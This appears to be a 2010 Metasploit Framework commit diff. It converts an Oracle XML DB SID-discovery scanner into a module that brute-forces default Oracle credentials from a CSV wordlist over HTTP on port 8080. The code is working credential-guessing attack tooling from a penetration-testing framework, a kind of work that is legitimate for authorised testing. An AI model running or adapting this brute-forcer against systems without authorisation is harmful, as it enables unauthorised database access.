5b6442aa58a9f4e9f715d34703ff002c991ccd05
Mario Ceballos <mc@metasploit.com>
2010-03-11 22:55:37 +0000

    added a patch and added a new module from Thomas Ring.
    git-svn-id: file:///home/svn/framework3/trunk@8800 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/auxiliary/scanner/oracle/xdb_sid_brute.rb
+++ modules/auxiliary/scanner/oracle/xdb_sid_brute.rb
@@ -15,31 +15,51 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'        => 'Oracle XML DB SID Discovery',
+			'Name'        => 'Oracle XML DB SID Discovery via Brute Force',
 			'Description' => %q{
-					This module simply makes a authenticated request to retrieve
-					the sid from the Oracle XML DB httpd server.
+					This module attempts to retrieve the sid from the Oracle XML DB httpd server, 
+					utilizing Pete Finnigan's default oracle password list.
 			},
-			'Version'     => '$Revision$',
+			'Version'     => '$Revision: 6876 $',
 			'References'  =>
 				[
 					[ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],
+					[ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv'],
 				],
-			'Author'      => [ 'MC' ],
+			'Author'      => [ 'nebulus' ],
 			'License'     => MSF_LICENSE
 		)
 
 		register_options(
 				[
+					OptString.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
+					OptBool.new('VERBOSE', [ false, 'Report each try', false]),
 					Opt::RPORT(8080),
-					OptString.new('DBUSER', [ false, 'The db user to authenticate with.',  'scott']),
-					OptString.new('DBPASS', [ false, 'The db pass to authenticate with.',  'tiger']),
 				], self.class)
+		deregister_options('DBUSER','DBPASS')
 	end
 
 	def run_host(ip)
 		begin
 
+		res = send_request_raw({
+			'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',
+			'version' => '1.0',
+			'method'  => 'GET'
+		}, 5)
+		return if not res
+
+		if(res.code == 200)
+			print_status("http://#{ip}:#{datastore['RPORT']}/oradb/PUBLIC/GLOBAL_NAME (#{res.code}) is not password protected.") if datastore['VERBOSE']
+			return
+		end
+
+		list = datastore['CSVFILE']
+
+		fd = CSV.foreach(list) do |brute|
+
+			datastore['DBUSER'] = brute[2].downcase
+			datastore['DBPASS'] = brute[3].downcase
 			user_pass = "#{datastore['DBUSER']}:#{datastore['DBPASS']}"
 	
 			res = send_request_raw({
@@ -54,9 +74,8 @@ class Metasploit3 < Msf::Auxiliary
 
 				if( not res )
 					print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...") if datastore['VERBOSE']
-					return
+					next
 				end
-
 				if (res.code == 200)
 					if (not res.body.length > 0)		
 					# sometimes weird bug where body doesn't have value yet
@@ -68,11 +87,13 @@ class Metasploit3 < Msf::Auxiliary
 							:proto	=> 'tcp',
 							:type	=> 'SERVICE_NAME',
 							:data	=> "#{sid}"
-						)	
-					print_status("Discovered SID: '#{sid}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
-				else
+						)
+					print_good("Discovered SID: '#{sid}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
+				elsif(datastore['VERBOSE'])
 					print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
 				end
+		end
+		print_status("Brute forcing #{ip}:#{datastore['RPORT']}...")
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
